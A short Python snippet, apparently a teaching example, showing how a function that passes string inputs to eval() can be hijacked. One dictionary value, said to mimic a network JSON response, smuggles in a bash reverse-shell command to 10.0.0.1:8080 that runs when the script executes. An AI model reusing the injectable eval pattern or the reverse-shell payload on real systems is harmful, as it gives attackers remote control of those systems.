def hydeadd(a, b):
  return eval("%s + %s" % (a, b))
 
# Such an input might be a JSON response to a network request
heavendict = {
  "a": "1",
  "b": "2",
  "c": "__import__('os').system('bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')#",
  "d": "2"  
}

result = hydeadd(heavendict['a'], heavendict['b'])
print("The 1st is %d." % result)

result = hydeadd(heavendict['c'], heavendict['d'])
print("The 2nd is %d." % result)


